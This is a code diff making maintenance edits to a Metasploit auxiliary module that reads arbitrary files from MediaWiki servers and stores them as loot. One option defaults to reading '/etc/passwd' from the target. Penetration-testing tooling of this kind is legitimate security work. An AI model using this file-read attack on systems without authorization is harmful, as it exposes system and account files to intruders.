@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -48,10 +45,9 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('RFILE', [true, 'Remote File', '/etc/passwd']),
       OptString.new('USERNAME', [ false,  "The user to authenticate as"]),
       OptString.new('PASSWORD', [ false,  "The password to authenticate with" ])
-    ], self.class)
+    ])
 
     register_autofilter_ports([ 80 ])
-    deregister_options('RHOST')
   end
 
   def get_first_session
@@ -269,7 +265,7 @@ class MetasploitModule < Msf::Auxiliary
 
     f = ::File.basename(datastore['RFILE'])
     path = store_loot('mediawiki.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-    print_status("#{peer} MediaWiki - #{datastore['RFILE']} saved in #{path}")
+    print_good("#{peer} MediaWiki - #{datastore['RFILE']} saved in #{path}")
   end
 
   def run
@@ -281,5 +277,4 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     accessfile(ip)
   end
-
 end
